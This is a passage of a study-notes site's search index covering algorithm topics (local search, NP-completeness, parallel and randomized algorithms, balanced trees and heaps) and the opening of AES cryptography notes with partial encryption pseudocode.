obtained by a small modification of S</li> <li>\\(N(S)\\): neighborhood of S</li> </ul>"},{"location":"course/ads/local/#vertex-cover","title":"Vertex Cover","text":"<ul> <li>\u95ee\u9898\u63cf\u8ff0: \u5728\u65e0\u5411\u56feG\u4e2d\u627e\u51fa\u6700\u5c0f\u7684\u70b9\u96c6S\uff0c\u5bf9\u4e8eG\u7684\u6bcf\u4e00\u6761\u8fb9\uff0c\u81f3\u5c11\u6709\u4e00\u4e2a\u9876\u70b9\u5728S\u4e2d</li> <li>\u57fa\u7840\u7b97\u6cd5<ul> <li>\u521d\u59cb\u9ed8\u8ba4\u9009\u53d6\u6240\u6709\u70b9\uff0c\u63a5\u4e0b\u6765\u6bcf\u6b21\u5220\u53bb\u4e00\u4e2a\u70b9\uff0c\u76f4\u81f3\u4e0d\u80fd\u5220\u53bb\u3002</li> </ul> </li> <li>Metropolis Algorithm<ul> <li>\u521d\u59cb\u9ed8\u8ba4\u9009\u53d6\u6240\u6709\u70b9\uff0c\u63a5\u4e0b\u6765\u6bcf\u6b21\u5220\u53bb/\u589e\u52a0\u4e00\u4e2a\u70b9\u3002</li> <li>\u82e5\u662f\u589e\u52a0\u4e00\u4e2a\u70b9\uff0c\u53ea\u6709\\(e^{-\\Delta cost/(kT)}\\)\u7684\u6982\u7387\u53ef\u4ee5\u901a\u8fc7\u3002</li> </ul> </li> </ul>"},{"location":"course/ads/local/#hopfield-neural-networks","title":"Hopfield Neural Networks","text":"<ul> <li>\u95ee\u9898\u63cf\u8ff0\uff1a\u7ed9\u5b9a\u5e26\u6743\u8fb9\\(w\\)\u7684\u65e0\u5411\u56feG\uff0c\u8981\u6c42\u5bf9\u8282\u70b9\u8d4b\u503c\\(s\\)(\u6b63/\u8d1f)\uff0c\u5e76\u6ee1\u8db3\u4e0b\u8ff0\u8981\u6c42<ul> <li>\u5b9a\u4e49\u597d\u8fb9\u548c\u574f\u8fb9(\u597d\u8fb9\u5c31\u662f\u6ee1\u8db3\u6761\u4ef6\u7684\u8fb9)\uff1a\\(w_es_us_v&lt;0\\)</li> <li>\u5bf9\u4e8e\u4e00\u4e2a\u9876\u70b9\uff0c\u5982\u679c\u5176\\(\\sum w_es_us_v&lt;0\\)\u5219\u79f0\u4e4b\u4e3a\u6ee1\u8db3\u7684\uff0c\u5982\u679c\u6240\u6709\u70b9\u90fd\u662f\u6ee1\u8db3\u7684\uff0c\u90a3\u4e48\u8fd9\u4e2a\u56fe\u5c31\u662f\u7a33\u5b9a\u7684</li> </ul> </li> <li>\u7b97\u6cd5<ul> <li>\u6bcf\u6b21\u9009\u53d6\u4e00\u4e2a\u70b9u\uff0c\u5176\\(\\sum w_es_us_v &gt; 0\\)\uff0c\u5e76\u6539\u53d8\u8be5\u70b9\u8d4b\u503c\uff0c\u76f4\u81f3\u6240\u6709\u70b9\u5747\u6ee1\u8db3</li> <li>\u7b97\u6cd5\u590d\u6742\u5ea6\u4e3a\\(O(W)\\)\uff0c\\(W=\\sum |w_e|\\)\u3002\u56e0\u4e3a\u6bcf\u6b21\u7ffb\u8f6c\u70b9\uff0c\u597d\u8fb9\u7684\u548c\u81f3\u5c11\u589e\u52a01\uff0c\u6700\u591a\u589e\u52a0\\(W\\)\u6b21\u3002</li> </ul> </li> </ul>"},{"location":"course/ads/local/#maximum-cut-problems","title":"Maximum Cut Problems","text":"<ul> <li>\u95ee\u9898\u63cf\u8ff0\uff1a\u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u627e\u5230\u4e00\u79cd\u5c06\u5176\u70b9\u5206\u6210\u4e24\u4e2a\u96c6\u5408A\u3001B\u7684\u65b9\u6cd5\uff0c\u4f7f\u5f97\u4e24\u7aef\u5206\u522b\u5728A\u3001B\u4e2d\u70b9\u8fb9\u7684\u6743\u91cd\u548c\u6700\u5927\u3002</li> <li>\u5b9a\u7406\uff1a\u5c40\u90e8\u6700\u4f18\u89e3\u7684\u6743\u91cd\u548c\u4e0d\u4f1a\u4f4e\u4e8e\u5168\u5c40\u6700\u4f18\u89e3\u7684\u4e00\u534a \\(w(A,B)\\ge \\frac{1}{2}w(A*,B*)\\)</li> <li>big-improvement-flip \u7b97\u6cd5<ul> <li>\u5f53\u65b0\u7684\u5c40\u90e8\u6700\u4f18\u89e3\u7684\u589e\u957f\u7684\u5e45\u5ea6\u5c0f\u4e8e\\(\\frac{2\\epsilon}{|v|}w(A,B)\\)\u7684\u65f6\u5019\u5c31\u505c\u6b62\uff0c\u4e3a\u4e86\u8ba9\u7b97\u6cd5\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u7ed3\u675f</li> <li>\u8fd9\u6837\u6709 \\((2+\\epsilon)w(A,B)\\ge w(A*,B*)\\)</li> <li>\u590d\u6742\u5ea6\u4e3a\\(O(n/\\epsilon \\log W)\\)</li> </ul> </li> </ul>"},{"location":"course/ads/np/","title":"NP Completeness","text":"<ul> <li>Decision problem (yes/no)</li> <li>Search problem (find the answer)</li> <li>Optimization problem</li> </ul>"},{"location":"course/ads/np/#nondeterministic-turing-machine","title":"Nondeterministic Turing machine","text":"<ul> <li>A Deterministic Turing Machine executes one instruction at each point in time. And then depending on the instruction, it goes to the next unique instruction.</li> <li>A Nondeterminism is now typically represented by giving a machine an extra input, the certificate or witness.</li> </ul>"},{"location":"course/ads/np/#np","title":"NP","text":"<ul> <li>NP: Nondeterministic polynomial-time</li> <li>NP Problem: \u5728 polynomial-time \u65f6\u95f4\u5185\u53ef\u4ee5\u9a8c\u8bc1\u7684\u95ee\u9898\u3002</li> <li>\\(NP \\overset{?}{=} P\\): \u662f\u5426\u6240\u6709\u80fd\u5728 polynomial-time \u65f6\u95f4\u5185\u9a8c\u8bc1\u7684\u7b97\u6cd5\u90fd\u80fd\u5728 polynomial-time \u5185\u88ab\u89e3\u51b3</li> </ul>"},{"location":"course/ads/np/#reduction-and-np-complete-problems","title":"Reduction and NP-Complete Problems","text":"<p>An NP-complete problem has the property that any problem in NP can be polynomially reduced to it.</p>"},{"location":"course/ads/np/#reduction","title":"reduction \u7ea6\u5316","text":"<p>To prove a reduction \\(A\\le_P B\\) , we require 3 steps</p> <ol> <li>We have to find the mapping function \\(f\\) and show that it runs in polynomial time.</li> <li>for all \\(x \\in A\\), then \\(f(x) \\in B\\)</li> <li>If \\(f(x)\\in B\\), then \\(x\\in A\\)</li> </ol> <p>\u5982\u679c \\(Q_1\\le_p Q_2\\), \u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\uff1a</p> <ul> <li>A polynomial-time algorithm for \\(Q_2\\) would sufficiently imply a polynomial-time algorithm for \\(Q_1\\).</li> <li>\\(Q_1\\) can be polynomially reduced to \\(Q_2\\)</li> </ul>"},{"location":"course/ads/np/#npc","title":"\u5e38\u89c1 NPC \u95ee\u9898","text":"<ul> <li>SAT Problem(\u7b2c\u4e00\u4e2a\u88ab\u8bc1\u660e\u4e3a NPC \u7684\u95ee\u9898): \u7ed9\u5b9a\u4e00\u4e2an\u4e2a\u5e03\u5c14\u53d8\u91cf\u7ec4\u6210\u7684\u5e03\u5c14\u8868\u8fbe\u5f0f\uff0c\u5224\u65ad\u5176\u6709\u6ca1\u6709\u53ef\u80fd\u4e3a\u771f</li> <li>Hamiltonian cycle Problem: \u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u5224\u65ad\u662f\u5426\u6709\u4e00\u4e2asimple cycle\u6070\u597d\u7ecf\u8fc7\u6bcf\u4e2a\u9876\u70b9\u4e00\u6b21</li> <li>Traveling Problem: \u7ed9\u5b9a\u4e00\u4e2a\u5e26\u6743\u56fe\uff0c\u95ee\u662f\u5426\u5b58\u5728\u4e00\u4e2asimple cycle\u7ecf\u5386\u8fc7\u6bcf\u4e2a\u8282\u70b9\u4e14\u7ecf\u5386\u8fb9\u7684\u6743\u91cd\u548c\u4e0d\u8d85\u8fc7K?</li> <li>Vertex Cover Problem: \u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u5224\u65ad\u662f\u5426\u5b58\u5728\u5176\u4e00\u4e2a\u5927\u5c0f\u4e0d\u8d85\u8fc7K\u7684\u70b9\u96c6\uff0c\u4f7f\u5f97\u56fe\u4e2d\u4efb\u4e00\u6761\u8fb9\u81f3\u5c11\u6709\u4e00\u4e2a\u9876\u70b9\u5728\u8fd9\u4e2a\u70b9\u96c6\u4e2d</li> <li>clique problem: \u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u5224\u65ad\u56fe\u662f\u5426\u6709\u4e00\u4e2a\u5927\u5c0f\u81f3\u5c11\u4e3aK\u7684\u5b8c\u5168\u5b50\u56fe\uff08\u56e2\uff09\u3002</li> </ul>"},{"location":"course/ads/np/#np-hard","title":"NP-Hard","text":"<p>If a NP-Hard problem is in NP, it is a HP-complete problem.</p> <p></p>"},{"location":"course/ads/np/#np-hard_1","title":"\u5e38\u89c1NP-hard\u95ee\u9898","text":"<ul> <li>\u6240\u6709NP-Complete\u95ee\u9898</li> <li>Halting problem(\u4e0d\u5c5e\u4e8eNP-Complete)</li> </ul>"},{"location":"course/ads/np/#formal-language-theory","title":"Formal-language Theory*","text":"<ul> <li>An alphabet \\(\\Sigma\\) is a finite set of symbols</li> <li>A language \\(L\\) over \\(\\Sigma\\) is any set of strings mode up of symbols from \\(\\Sigma\\)</li> <li>Denote empty string be \\(\\varepsilon\\)</li> <li>Denote empty language by \\(\\emptyset\\)</li> <li>Language of all strings over \\(\\Sigma\\) is denoted by \\(\\Sigma^{\\star}\\)</li> <li>The complement of \\(L\\) is denoted by \\(\\Sigma^{\\star}-L\\)</li> <li>The concatenation of two languages \\(L_1\\) and \\(L_2\\) is the language \\(L=\\{x_1x_2: x_1\\in L_1\\ {\\rm and}\\ x_2\\in L_2\\}\\)</li> <li>The closure of Kleene star of a language \\(L\\) is the language \\(L^{\\star}=\\{\\varepsilon\\}\\cup L\\cup L^2\\cup L^3\\cup \\cdots\\), where \\(L^k\\) is the language obtained by cocncatenating \\(L\\) to itself \\(k\\) times</li> </ul>"},{"location":"course/ads/para/","title":"Parallel Algorithms","text":""},{"location":"course/ads/para/#parallel-random-access-machine-pram","title":"Parallel Random Access Machine (PRAM)","text":"<ul> <li>Exclusive-Read Exclusive-Write (EREW)</li> <li>Concurrent-Read Exclusive-Write (CREW)</li> <li>Concurrent-Read Concurrent-Write (CRCW)</li> </ul>"},{"location":"course/ads/para/#work-depthwd","title":"Work-Depth(WD)","text":"<p>\u76f8\u6bd4\u4e8ePRAM\uff0cWD\u7684\u6bcf\u4e2a\u65f6\u949f\u5185\uff0c\u4e0d\u4e00\u5b9a\u6240\u6709CPU\u90fd\u5728\u5de5\u4f5c</p>"},{"location":"course/ads/para/#measuring-the-performance","title":"Measuring the performance","text":"<ul> <li>W(n): \u89e3\u51b3\u95ee\u9898\u6240\u8981\u7684\u57fa\u672c\u64cd\u4f5c\u6570\u91cf</li> <li>T(n): \u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u5305\u62ec\u8ba1\u7b97\u65f6\u95f4\u548c\u5e76\u884c\u65f6\u95f4\u4e24\u90e8\u5206\u3002</li> </ul> \\[ \\rm{Time\\ Cost} = \\begin{cases} T(n) &amp;P(n)&gt;\\frac{W(n)}{T(n)}\\\\ W(n)/P(n) &amp;P(n) \\le \\frac{W(n)}{T(n)}\\\\ T(n)+W(n)/P(n) &amp; for\\ all\\ P(n)\\\\ \\end{cases} \\]"},{"location":"course/ads/para/#summation-problem","title":"Summation Problem","text":""},{"location":"course/ads/para/#pram-model","title":"PRAM Model","text":"<p>\u5bf9\u4e8e\u7a7a\u95f2\u7684CPU\uff0c\u5fc5\u987b\u7b49\u5f85\u3002 </p>"},{"location":"course/ads/para/#wd-presentation","title":"WD Presentation","text":"<ul> <li>\\(W(N)=O(N)\\)</li> <li>\\(T(N) = O(\\log{N})\\)</li> </ul>"},{"location":"course/ads/para/#prefix-sums","title":"Prefix-Sums","text":"<ul> <li>\u95ee\u9898\uff1a\u5229\u7528\u5e76\u884c\u7b97\u6cd5\u6c42\u524d\u7f00\u548c</li> </ul> <ul> <li>\u7b97\u6cd5\uff1a\u81ea\u5e95\u81f3\u4e0a\u8ba1\u7b97B()\uff0c\u81ea\u9876\u5411\u4e0b\u8ba1\u7b97C()<ul> <li>B(): \u8ba1\u7b97\u5b50\u6811\u548c</li> <li>C(): \u8ba1\u7b97\u524d\u7f00\u548c</li> <li> \\[                         \\begin{cases}                         C(h,i)=B(h,i)&amp; i==1\\\\                         C(h,i)=C(h+1,i)&amp; i\u4e3a\u5076\u6570\\\\                         C(h,i)=C(h+1,\\frac{i-1}{2})+B(h,i) &amp; i\u4e3a\u5947\u6570\u4e14\u5927\u4e8e1                         \\end{cases}     \\] </li> <li></li> </ul> </li> <li>\\(T(N)=O(\\log{N})\\)</li> <li>\\(W(N)=O(N)\\)</li> </ul>"},{"location":"course/ads/para/#mergingranking-problem","title":"Merging/Ranking Problem","text":"<ul> <li>\u95ee\u9898\uff1a\u5229\u7528\u5e76\u884c\u7b97\u6cd5\u5408\u5e76\u6709\u5e8f\u5e8f\u5217</li> <li>\u7b97\u6cd5<ul> <li>\u8981\u5408\u5e76\u4e24\u4e2a\u6709\u5e8f\u5e8f\u5217\uff0c\u9700\u8981\u5148\u77e5\u9053\u4ed6\u4eec\u6bcf\u4e2a\u5143\u7d20\u5728\u5bf9\u65b9\u5e8f\u5217\u4e2d\u7684\u6392\u540d\uff0c\u8bb0\u4e3a <code>Rank</code></li> <li>\u6743\u8861\u4e8c\u5206\u67e5\u627e\u548c\u987a\u5e8f\u904d\u5386\u7684\u5229\u5f0a\uff0c\u91c7\u53d6\u5206\u5757\u7684\u65b9\u5f0f</li> <li>\u7b2c\u4e00\u6b65(Partitioning)\uff1a\u5728\u4e24\u4e2a\u5e8f\u5217\u4e2d\u5404\u5747\u5300\u53d6\\(\\frac{N}{\\log{N}}\\)\u4e2a\u5143\u7d20\uff0c\u91c7\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65b9\u6cd5\u83b7\u53d6\u5176\u4f4d\u7f6e</li> <li>\u7b2c\u4e8c\u6b65(Actual Ranking)\uff1a\u5bf9\u4e8e\u5df2\u77e5Rank\u5143\u7d20\u4e4b\u95f4\u7684\u5143\u7d20\uff0c\u91c7\u53d6\u987a\u5e8f\u904d\u5386\u7684\u65b9\u5f0f</li> </ul> </li> <li>\\(T(N)=O(\\log{N})\\)</li> <li>\\(W(N)=O(N)\\)</li> </ul>"},{"location":"course/ads/para/#maximum-finding","title":"Maximum Finding","text":""},{"location":"course/ads/para/#replace-by-max-in-the-summation-algorithm","title":"replace '+' by 'max' in the summation algorithm","text":"<ul> <li>\\(T(N)=O(\\log{N})\\)</li> <li>\\(W(N)=O(N)\\)</li> </ul>"},{"location":"course/ads/para/#_1","title":"\u5927\u529f\u7387\u8dd1\u8f66\u6cd5","text":"<ul> <li>\\(T(N)=O(1)\\)</li> <li>\\(W(N)=O(N^2)\\)</li> </ul>"},{"location":"course/ads/para/#doubly-logarithmic-paradigm","title":"Doubly-logarithmic Paradigm","text":"<ul> <li>\u65b9\u6839\u5206\u7ec4\u6cd5\uff1a\u628a\u5e8f\u5217\u5206\u6210\\(\\sqrt{n}\\)\u7ec4\uff0c\u9012\u5f52\u6b64\u65b9\u6cd5\uff0c\u5728\u627e\u5230\u6700\u5927\u503c\u540e\uff0c\u4f7f\u7528\u5927\u529f\u7387\u8dd1\u8f66\u6cd5\u5408\u5e76<ul> <li>\u6709\\(T(n)\\le T(\\sqrt{n})+1\\)\uff0c\\(W(n)\\le\\sqrt{n}W(\\sqrt{n})+n\\)</li> <li>\\(T(N)=O(\\log\\log{N})\\)</li> <li>\\(W(N)=O(N\\log\\log{N})\\)</li> </ul> </li> <li>\u53cc\u5bf9\u6570\u5206\u7ec4\u6cd5: \u628a\u5e8f\u5217\u5206\u6210\\(N/\\log\\log{n}\\)\u7ec4\uff0c\u9012\u5f52\u6b64\u65b9\u6cd5\uff0c\u5728\u627e\u5230\u6700\u5927\u503c\u540e\uff0c\u4f7f\u7528\u5927\u529f\u7387\u8dd1\u8f66\u6cd5\u5408\u5e76<ul> <li>\u6709\\(T(n)\\le T(n/\\log\\log{n})+1\\)\uff0c\\(W(n)\\le(n/\\log\\log{n})W(n/\\log\\log{n})+n\\)</li> <li>\\(T(N)=O(\\log\\log{N})\\)</li> <li>\\(W(N)=O(N)\\)</li> </ul> </li> </ul>"},{"location":"course/ads/para/#random-sampleing","title":"Random Sampleing","text":"<ul> <li>\u7b97\u6cd5\u6d41\u7a0b\uff1a</li> <li>\\(T(N)=O(1)\\)</li> <li>\\(W(N)=O(N)\\)</li> <li>\u6781\u5927\u7684\u6982\u7387\u5f97\u5230\u6b63\u786e\u7b54\u6848\uff0c\u4e0d\u6b63\u786e\u7684\u6982\u7387\u4ec5\u4e3a\\(O(1/n^c)\\)</li> </ul>"},{"location":"course/ads/random/","title":"Randomized Algorithms","text":""},{"location":"course/ads/random/#monte-carlo-method","title":"Monte Carlo method","text":"<p>efficient raodomized algorithms that only need to yield the correct answer with high probability.</p>"},{"location":"course/ads/random/#las-vegas-algorithm","title":"Las Vegas algorithm","text":"<p>randomized algorithms that are always correct, and run efficiently in expectation.</p>"},{"location":"course/ads/random/#hiring-problem","title":"Hiring Problem","text":"<ul> <li>\u4f9d\u6b21\u9762\u8bd5\\(N\\)\u4e2a\u4eba\uff0c\u76ee\u7684\u662f\u627e\u5230\u6700\u597d\u7684\u90a3\u4e2a\u4eba\u3002\u6bcf\u4e2a\u4eba\u9762\u8bd5\u5b8c\u5fc5\u987b\u9a6c\u4e0a\u544a\u77e5\u662f\u5426\u5f55\u7528\uff0c\u5982\u679c\u5df2\u5f55\u7528\uff0c\u5fc5\u987b\u652f\u4ed8\u4ee3\u4ef7\\(Ch\\)\uff0c\u6bcf\u6b21\u9762\u8bd5\u4e5f\u6709\u4ee3\u4ef7\\(Ci\\)\uff0c\u4f46\u662f\\(Ci\\ll Ch\\)\u3002</li> <li>\u4e00\u822c\u7b97\u6cd5\uff1a\u4f9d\u6b21\u9762\u8bd5\uff0c\u671f\u671b\u65f6\u95f4\u5f00\u9500\u4e3a\\(Ch\\times \\log N + Ci\\times N\\)<ul> <li>\u56e0\u4e3a\u5bf9\u4e8e\u7b2c\\(i\\)\u4e2a\u4eba\uff0c\u6bd4\u524d\u9762\\(i-1\\)\u4e2a\u4eba\u90fd\u4f18\u79c0\u7684\u6982\u7387\u4e3a\\(\\frac{1}{i}\\)\uff0c\\(\\sum\\limits^{N}_{i=1} \\frac{1}{i}=\\ln{N}\\)</li> </ul> </li> <li>Online Hiring Algorithm\uff1a\u4f9d\u6b21\u9762\u8bd5\u524d\u9762\\(k\\)\u4e2a\u4eba\uff0c\u540e\u9762k+1~N\u7684\u4eba\u4e2d\uff0c\u82e5\u6709\u6bd4\u524d\u9762k\u4e2a\u4eba\u4f18\u79c0\u7684\uff0c\u5c31\u76f4\u63a5\u5f55\u7528\uff0c\u5e76\u7ed3\u675f\u9762\u8bd5<ul> <li>\u5b9a\u4e49\u4e24\u4e2a\u4e8b\u4ef6<ul> <li>\u4e8b\u4ef6A: \u5728\u6700\u4f18\u79c0\u7684\u5458\u5de5\u5728\u4f4d\u7f6e\\(i\\)</li> <li>\u4e8b\u4ef6B: \u4f4d\u7f6e\u5728k+1~i-1\u7684\u5458\u5de5\u6ca1\u6709\u4e00\u4e2a\u88ab\u96c7\u4f63</li> <li>A\u548cB\u76f8\u4e92\u72ec\u7acb\uff0c\u5bf9\u4e8eA\uff0c\u6982\u7387\u4e3a\\(\\frac{1}{N}\\)\uff1b\u5bf9\u4e8eB\uff0c\u6982\u7387\u4e3a\\(\\frac{k}{i-1}\\) (\u524di-1\u4e2a\u5458\u5de5\u4e2d\u6700\u4f18\u79c0\u7684\u5728\u524dk\u4e2a\u4f4d\u7f6e\u4e2d)</li> </ul> </li> <li>\u80fd\u96c7\u4f63\u5230\u6700\u4f18\u79c0\u5458\u5de5\u7684\u6982\u7387\u4e3a\\(\\frac{k}{N}\\ln(\\frac{N}{k})\\le Pr[S]\\le \\frac{k}{N}\\ln(\\frac{N-1}{k-1})\\)\uff0c\\(Pr[S]=\\frac{k}{N}\\sum\\limits^{N-1}_{i=k}\\frac{1}{i}\\)</li> <li>\u5927\u7ea6\u5728\\(k=\\frac{N}{e}\\)\uff0c\u6982\u7387\u53d6\u5230\u6700\u5927\u503c</li> </ul> </li> </ul>"},{"location":"course/ads/random/#quick-sort","title":"Quick Sort","text":""},{"location":"course/ads/random/#time-complexity-proof","title":"time complexity proof","text":"<p>\u5047\u8bbe\\(A^{j}_{i}\\) \u4e3a\u7b2ci\u4f4d\u548c\u7b2cj\u4f4d\u8fdb\u884c\u6bd4\u8f83\u7684\u4e8b\u4ef6\uff0c\u6613\u77e5\u53ea\u6709\u7b2ci+1...j-1\u4f4d\u6ca1\u6709\u88ab\u9009\u6210pivot\u65f6\u8be5\u4e8b\u4ef6\u624d\u4f1a\u53d1\u751f\uff0c\u6545\\(P(A^{j}_{i})=\\frac{2}{j-i+1}\\) \\(T=\\sum\\limits_{j}\\sum\\limits_{i}P(A^{j}_{i}) = O(n\\log{n})\\)</p>"},{"location":"course/ads/random/#modified-quick-sort","title":"Modified Quick Sort","text":"<ul> <li>central splitter\uff1a\u5c06\u6570\u7ec4\u5206\u6210\u4e24\u6bb5\u7684pivot\u5e76\u4e14\u6bcf\u6bb5\u81f3\u5c11\u662f\u603b\u957f\u5ea6\u76841/4</li> <li>Modified Quicksort\uff1a\u5728\u5f00\u59cb\u9012\u5f52\u4e4b\u524d\u9009\u62e9\u51fa\u4e00\u4e2a\u4e2d\u5fc3\u5206\u5272\u70b9</li> <li>\u9009\u51faModified Quicksort\u7684\u671f\u671b\u6b21\u6570\u4e3a2\uff08\u56e0\u4e3a\u6ee1\u8db3\u6761\u4ef6\u7684\u70b9\u5171\u5360\\(\\frac{1}{2}\\)\uff09</li> </ul>"},{"location":"course/ads/rb/","title":"Red-Black Trees","text":""},{"location":"course/ads/rb/#definition","title":"Definition","text":"<ul> <li>Every node is either red or black</li> <li>The root is black</li> <li>Every leaf(NIL) is black</li> <li>If a node is red, then both its children are black</li> <li>For each node, all simple paths from the node to descendant leaves contain the same number of black nodes</li> </ul>"},{"location":"course/ads/rb/#lemma","title":"Lemma","text":"<ul> <li>A red-black tree with n internal nodes has height at most \\(2\\ln(N+1)\\)</li> <li>Proof     $$     \\begin{aligned}     {\\rm sizeof}(x) &amp;= 1+2{\\rm sizeof}(child)\\     &amp;\\ge 1+2\\cdot2^{bh(child)}\\      &amp;\\ge 1+2\\cdot2^{bh(x)-1}\\     &amp;\\ge 1+2\\cdot2^{h(x)/2-1}\\     h(x)/2-1 &amp;\\le\\ln(({\\rm sizeof}(x)-1)/2) \\le\\ln({\\rm sizeof }(x))\\     h(x) &amp;\\le 2\\ln({\\rm sizeof(x)})+1     \\end{aligned}     $$</li> </ul>"},{"location":"course/ads/rb/#insert","title":"Insert","text":"<ul> <li>the initial color of the node is red</li> </ul>"},{"location":"course/ads/rb/#delete","title":"Delete","text":"<ul> <li>Delete a leaf node: Reset its parent link to NIL</li> <li>Delete a degree 1 node: Replace the node by its single child</li> <li>Delete a degree 2 node: Replace the node by the largest one in the left subtree or the smallest one in the right subtree.</li> <li>the number of rotations in the DELETE operation is \\(O(1)\\).\u7ea2\u9ed1\u6811\u5728Insert\u4e2d\u65cb\u8f6c\u6b21\u6570\u4e0d\u8d85\u8fc72\uff0c\u5220\u9664\u7684\u8fc7\u7a0b\u4e2d\u65cb\u8f6c\u6b21\u6570\u4e0d\u8d85\u8fc73</li> </ul>"},{"location":"course/ads/rb/#how-to-replace","title":"How to Replace","text":"<p>Accoring to the three situations, the second and third situation can be transfomed into situation 1. Therefore, we only need to care about situation1 -- how to delete a leaf node. Unfortunately, we can't delete leaf node directly, for the existence of external nodes.</p> <ul> <li>case1     </li> <li>case2     </li> <li>case3     </li> <li>case4     </li> </ul>"},{"location":"course/ads/skew/","title":"Skew Heaps","text":"<p>a simple version of the C01N-Leftlist Heaps</p>"},{"location":"course/ads/skew/#character","title":"Character","text":"<p>Any M consecutive operations take at most \\(O(M\\log{N})\\) time</p>"},{"location":"course/ads/skew/#merge","title":"Merge","text":"<p>Always swap the left and right children except that the largest of all the nodes on the right paths does not have its children swapped.</p>"},{"location":"course/ads/skew/#analysis","title":"Analysis","text":""},{"location":"course/ads/skew/#heavy-node","title":"heavy node","text":"<p>A node p is heavy if the number of descendants of p's right subtree is at least half of the number of descendants of p, and light otherwise.</p>"},{"location":"course/ads/skew/#amortized-analysis","title":"Amortized Analysis","text":"<p>Proof \\(T_{\\rm amortized}=O(\\log{N})\\) Let \\(\\Phi(D_i)=\\rm number \\ of\\ heavy\\ node\\) Thus</p> \\[ \\begin{aligned} &amp;\\Phi_i = h_1+h_2+h\\\\ &amp;\\Phi_{i+1} \\le l_1+l_2+h(\\rm all \\ the\\ h_i\\ will\\ change\\ into\\ l_i)\\\\ \\end{aligned} \\] \\[ \\begin{aligned} T_{\\rm amoritized} &amp;= T_{\\rm worst}+\\Phi_{i+1}-\\Phi_{i}\\\\ &amp;=(l_1+l_2+h_1+h_2) + \\Phi_{i+1}-\\Phi_{i}\\\\ &amp;\\le 2(l_1+l_2) \\end{aligned} \\] <p>light nodes along the right path: \\(l=O(\\log{N})\\to T_{\\rm amortized}=O(\\log{N})\\)</p>"},{"location":"course/ads/splay/","title":"Splay Trees","text":""},{"location":"course/ads/splay/#definition","title":"Definition","text":"<p>Any \\(M\\) consecutive tree operations starting from an empty tree take at most \\(O(M\\log N)\\) time.</p>"},{"location":"course/ads/splay/#rotation","title":"Rotation","text":"<ul> <li>zig-zag<ul> <li></li> </ul> </li> <li>zig-zig<ul> <li></li> </ul> </li> </ul>"},{"location":"course/ads/splay/#analysis","title":"Analysis","text":"<p>Let \\(\\Phi(T)=\\sum\\limits_{i\\in T}\\log{Size(i)}\\) According to \\(\\hat{c_i} = c_i + \\Phi(T) - \\Phi(T_{{\\rm before}})\\) Moreover, we can proof that</p> \\[ \\begin{aligned} Zig&amp;: \\hat{c_i}=c_i+\\Phi(T)-\\Phi(T')=1+R_2(X)-R_1(X)+R_2(P)-R_1(P)\\le 1+R_2(X)-R_1(X)\\\\ Zig-Zag&amp;: \\hat{c_i}=c_i+\\Phi(T)-\\Phi(T')=2+R_2(X)-R_1(X)+R_2(P)-R_1(P)+R_2(G)-R_1(G)\\le 2(R_2(X)-R_1(X))\\\\ Zig-Zig&amp;: \\hat{c_i}=c_i+\\Phi(T)-\\Phi(T')=2+R_2(X)-R_1(X)+R_2(P)-R_1(P)+R_2(G)-R_1(G)\\le 2(R_2(X)-R_1(X))\\\\ \\end{aligned} \\] <p>Thus, the amortized time to splay a tree with root \\(T\\) at node \\(X\\) is at most \\(3(R(T)-R(X))+1=O(\\log{N})\\)</p>"},{"location":"course/crypto/","title":"\u5bc6\u7801\u5b66(2021-2022\u6625\u590f)","text":""},{"location":"course/crypto/#introduction","title":"Introduction","text":"<p>\u4e0a\u7684\u662f\u767d\u6d2a\u6b22\u8001\u5e08\u7684\u5bc6\u7801\u5b66\u8bfe\u7a0b\u3002 \u8bfe\u4e0a\u4e3b\u8981\u4ecb\u7ecd\u4e86\u53e4\u5178\u5bc6\u7801\u5b66\uff0c\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u548c\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002 \u8bfe\u7a0b\u504f\u5411\u5de5\u7a0b\u5b9e\u8df5\uff0c\u6570\u5b66\u76f8\u5173\u7684\u8bc1\u660e\u8f83\u5c11\u3002 \u7b14\u8bb0\u4ec5\u4f9b\u53c2\u8003\uff0c\u5982\u679c\u6709\u7eb0\u6f0f\uff0c\u6b22\u8fce\u90ae\u4ef6\u8054\u7cfb\u3002  </p>"},{"location":"course/crypto/#references","title":"References","text":"<ul> <li>\u5f80\u5e74\u7684\u8003\u5bdf\u77e5\u8bc6\u70b9</li> <li>\u4e00\u4f4d\u5b66\u957fNotion\u7b14\u8bb0</li> </ul>"},{"location":"course/crypto/AES/","title":"AES","text":""},{"location":"course/crypto/AES/#introduction","title":"Introduction","text":"<p>\u6700\u4e3a\u201c\u53ef\u9760\u201d\u7684\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5 WinRAR\uff0c7-zip\u52a0\u5bc6\u6587\u4ef6\u65f6\u7528\u7684\u5c31\u662fAES \u52d2\u7d22\u8f6f\u4ef6\u7528\u7684\u4e5f\u662fAES\u7b97\u6cd5\u52a0\u5bc6\uff08\u4f7f\u7528RSA\u4f20\u9012\u5bc6\u94a5\uff09</p>"},{"location":"course/crypto/AES/#format","title":"Format","text":"<p>\u660e\u6587\u957f\u5ea6=16byte\uff0c\u5bc6\u6587\u957f\u5ea6=16byte AES\u7684key\u6709\u4e09\u79cd\u89c4\u683c\uff0c\u5206\u522b\u4e3a(16byte\uff0c24byte,32byte)</p>"},{"location":"course/crypto/AES/#encryption","title":"Encryption","text":"<pre><code>unsigned char a[4] = {0x03, 0x01, 0x01, 0x02}; \nAddRoundKey(p, k);  // \u5708\u5bc6\u94a5\u52a0\u6cd5\u8fd0\u7b97 result = p ^ k \n                    // (\u5728GF(2^8)\u4e2d\u52a0\u6cd5\u7b49\u4ef7\u4e8e\u5f02\u6216)\nfor(i=1; i&lt;=10; i++) { \n    ByteSub(p, 16); // sbox\u5b57\u8282\u66ff\u6362 p[i] = sbox[p[i]]; \n    // \u5728ShiftRow\u4e4b\u524d\uff0cp\u8981\u8fdb\u884c\u884c\u5217\u53d8\u6362\n    ShiftRow(p); // 